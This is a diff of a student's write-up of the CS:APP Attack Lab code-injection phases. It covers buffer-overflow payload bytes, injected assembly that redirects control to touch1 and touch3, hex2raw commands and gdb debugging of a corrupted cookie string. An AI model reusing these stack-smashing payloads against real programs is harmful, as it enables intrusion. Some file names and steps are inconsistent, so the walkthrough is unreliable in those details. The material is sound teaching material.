@@ -1328,7 +1328,7 @@ If we type a long string, the bounds of arrays will be overrun. Whereas, we shou
 
 ##### **Part I: Code Injection Attacks**
 
-###### Level 1  touch1
+##### Level 1  touch1
 
 Task of phase 1: To Call `touch1` when `getbuf()` returns instead of returning to the caller: `test()`.
 
@@ -1392,7 +1392,7 @@ When the program is running to `0x4017ac`, I examine the content at the address 
 
 `0x401976` is exactly the address where the instruction follows the call of `getbuf()`; the instruction at `0x4017bd c3 	retq` will return here and it is what we are going to corrupt. 
 
-(2) Since in `getbuf()` the stack pointer `%rsp` is decreased by `0x28` which is 40, I modify my input with 10 lines of `61 62 63 64`  in `exploit.txt`. 
+(2) Since in `getbuf()` the stack pointer `%rsp` is decreased by `0x28` which is 40, I modify my input with 10 lines of `61 62 63 64`  in `exploit_lv1.txt`. 
 
 ```txt
   1 61 62 63 64   /* a b c d */
@@ -1431,9 +1431,21 @@ Hence, I input the return address of `touch1` in the line of 11. Note the order 
 11 c0 17 40 00   /* the return address of touch1 */
 ```
 
+(4) Convert the byte sequence in `exploit_lv1.txt` to input string.
+
+```shell
+Linux> ./hex2raw < ./part_1/exploit_lv1.txt > ./part_1/exploit_lv2_raw.txt
+```
+
+(5) Then run it again.
+
+```shell
+(gdb)start -q < ./part_1/exploit_lv1_raw.txt
+```
+
 Great! It called `touch1`. 
 
-###### Level 2 touch2
+##### Level 2 touch2
 
 **Tips:** 
 
@@ -1623,12 +1635,14 @@ When the instruction at `0x401802` is being executed, the content in `0x202ce2(%
 
 Ah ! At last, the solution is valid. Great !
 
-###### Level 3 touch3
+##### Level 3 touch3
 
 **Tips:**
 
 > 1. `sprintf(char *s, const char *format, ...)` writes the output into the string "s". 
+> 2. Note that in x86-64 machine, each instruction of  `push` or `put` increase or decrease 8 bytes. See `bytes_per_push.c` in practice problem 4.6. 
 
+**Question:** 
 "Phase 3 also involves a code injection attack, but passing a string as argument. "
 
 What does this phase ask us to do?
@@ -1649,7 +1663,7 @@ What does this phase ask us to do?
 
 ***Analyses***
 
-(1) Put my cookie as string on the top of the stack of `getbuf` for now. It might be corrupted by `hexmatch` or `strncmp` later, but I will move it to a proper place. 
+1) Put my cookie as string on the top of the stack of `getbuf` for now. It might be corrupted by `hexmatch` or `strncmp` later, but I will move it to a proper place. 
 
 1.1) Find the the sequence of bytes of my cookie, `59b997fa\0` , as a string in the ASCII table.
 
@@ -1657,7 +1671,7 @@ What does this phase ask us to do?
 59b997fa\0  :  35 39 62 39 39 37 66 61 00
 ```
 
-(2) Create the exploit byte code.
+2) Create the exploit byte code.
 
 2.1) Write my exploit assembly code. 
 
@@ -1666,9 +1680,9 @@ N.B. `%rsp: $0x5561dc78` is the address of the stack top of `getbuf`.
 ```assembly
 # assem_lv3.s
 # Hand-generated assembly code of the level 3 of part 1.
-# The address is (%rsp: $0x5561dc78) for now because I will put the address of 
-# my cooike here, for now. 
-mov $0x5561dc78, %rdi   
+# The address is (%rsp: $0x5561dc78) where I will put the address of 
+# my cooike as a string here for now. 
+mov $0x5561dc78, %rdi   # Pass the address of my string as the first argument
 pushq $0x4018fa   # Push the address of touch3.   
 retq
 ```
@@ -1697,9 +1711,9 @@ objdump -d assem_lv3.o > assem_lv3.d
 
 ```assembly
   /* The byte sequence of my cookie as a string. There is a terminal '\0' after '61'. */
-  1 35 39 62 39     
+  1 35 39 62 39     /* The address is %rsp: $0x5561dc78. The string starts.  */
   2 39 37 66 61
-  3 00 00 00 00
+  3 00 00 00 00		/* This line starts at 0x5561dc80 */
   4 48 c7 c7 78     /* The byte code of my exploit assembly  */
   5 dc 61 55 68
   6 fa 18 40 00
@@ -1707,10 +1721,85 @@ objdump -d assem_lv3.o > assem_lv3.d
   8 00 00 00 00
   9 00 00 00 00
  10 00 00 00 00
- 11 8a dc 61 55     
+ 11 84 dc 61 55     
 ```
 
-Note that my exploit starts at the 4th line, namely `0x12(%rsp)` which is `0x5561dc8a`(Wrong!!) .  It is NOT the hexadecimal `0x12`, but the decimal `12` which is `0xc` in hexadecimal format. Since `0x5561dc78 + 0xc=0x5561dc84`, the last line is `84 dc 61 55`. 
+Note that my exploit starts at the 4th line, namely `0x12(%rsp)` which is `0x5561dc8a`(Wrong!!) .  It is NOT the hexadecimal `0x12`, but the decimal `12` which is `0xc` in hexadecimal format. Since `0x5561dc78 + 0xc=0x5561dc84`, therefore, the last line is `84 dc 61 55` where the `getbuf` will transfer control to. 
 
-The answer is wrong! To be correct. 
+2.4) Convert the byte code to input string.
+
+```shell
+Linux> ./hex2raw < ./part_1/exploit_lv3.txt > ./part_1/exploit_lv3_raw.txt
+```
+
+2.5)  Then redirect the input in gdb.
+
+```shell
+(gdb)start -q < ./part_1/exploit_lv2_raw.txt
+```
+
+My exploit transfers control to the `touch3`, but it doesn't satisfy the `hexmatch` and leads to that the `else`  branch is executed. "Misfire"!. The solution is wrong! Let's find out. 
+
+3) After rereading the C code of `hextmatch`, I run `gdb` and let it step into `hexmactch` to examine the arguments of `stncmp`. 
+
+```assembly
+000000000040184c <hexmatch>:
+  40184c:	41 54                	push   %r12
+  40184e:	55                   	push   %rbp
+  40184f:	53                   	push   %rbx
+  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp  # add $-128, %rsp
+  401854:	41 89 fc             	mov    %edi,%r12d
+  401857:	48 89 f5             	mov    %rsi,%rbp
+  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+  #... 
+  4018c4:	ba 09 00 00 00       	mov    $0x9,%edx
+  4018c9:	48 89 de             	mov    %rbx,%rsi
+  4018cc:	48 89 ef             	mov    %rbp,%rdi
+> 4018cf:	e8 cc f3 ff ff       	callq  400ca0 <strncmp@plt>
+  # ...
+```
+
+3.1) I find that the first argument `%rdi`  of the `strncmp`is an empty string. What's wrong ? It is `sval` which is my input cookie. This `%rdi` is from the `%rsi` of the arguments of `hexmatch`. 
+
+One thing I didn't notice is that the stack after `getbuf` is reset, therefore, I should pay attention to whether my exploit is contaminated or not. Another thing I didn't realised is that each `push` or `pop` increases or decreases 8 bytes in a x86-64 machine. 
+
+Rerun the program to the beginning of `hexmatch`.
+
+```assembly
+00000000004018fa <touch3>:
+  4018fa:	53                   	push   %rbx
+  4018fb:	48 89 fb             	mov    %rdi,%rbx  # %rbx is reused in "hexmatch"
+  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
+  401905:	00 00 00 
+  401908:	48 89 fe             	mov    %rdi,%rsi
+  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
+  401911:	e8 36 ff ff ff       	callq  40184c <hexmatch>
+
+000000000040184c <hexmatch>:
+  40184c:	41 54                	push   %r12
+  40184e:	55                   	push   %rbp
+> 40184f:	53                   	push   %rbx	 # This %rbx is from %rdi in "hexmatch".
+  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp  # add $-128, %rsp
+  401854:	41 89 fc             	mov    %edi,%r12d
+  401857:	48 89 f5             	mov    %rsi,%rbp
+  40185a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+```
+
+Then `(gdb)display  /s ($rsi)` to monitor when it is corrupted. After executing  the instruction at `0x40184f`, my input cookie string is contaminated. The reason is that `%rbx` is pushed to the stack; its value is `0x5561dc78` which is come from `touch3`.  We can see that the character after `fa` is `x` in `"59b997fax\334aU"` and `'x'` is represented by `0x78`.  Got it!
+
+```shell
+(gdb)
+0x000000000040184f      62      in visible.c
+1: x/s ($rsi)  0x5561dc78:      "59b997fa"
+(gdb)
+0x0000000000401850      62      in visible.c
+1: x/s ($rsi)  0x5561dc78:      "59b997fax\334aU"
+# Display the content in %rsp.
+(gdb)
+0x0000000000401850      62      in visible.c
+2: /x $rsp = 0x5561dc80
+# Examine the first byte at 0x5561dc80; it is 0x78. 
+(gdb) x/1bx $rsp
+0x5561dc80:     0x78
+```
 
